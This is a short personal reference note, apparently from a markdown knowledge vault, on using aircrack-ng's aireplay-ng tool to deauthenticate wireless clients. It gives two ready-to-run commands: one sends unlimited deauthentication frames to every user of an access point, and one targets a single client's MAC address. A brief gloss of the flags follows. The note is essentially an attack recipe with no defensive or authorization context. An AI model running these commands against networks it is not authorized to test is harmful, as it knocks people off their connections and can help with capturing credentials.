---
title: "aircrack-ng - Deauth User(s)"
created: 2020-05-29T17:58:42.718-05:00
modified: 2021-08-20T22:36:50.318-05:00
parent: "[[aircrack-ng (Suite)]]"
children: []
---
deauth every user
```
aireplay-ng --deauth 0 -a <AP's MAC/BSSID> <NIC monitor mode>
```

deauth single user
```
aireplay-ng --deauth 0 -a <AP's MAC/BSSID> -c <client's MAC> <NIC monitor mode>
```

where:
- --deauth 0 - deauth and count
- -a - set Access Point MAC address
- -c - client’s MAC to deauthenticate
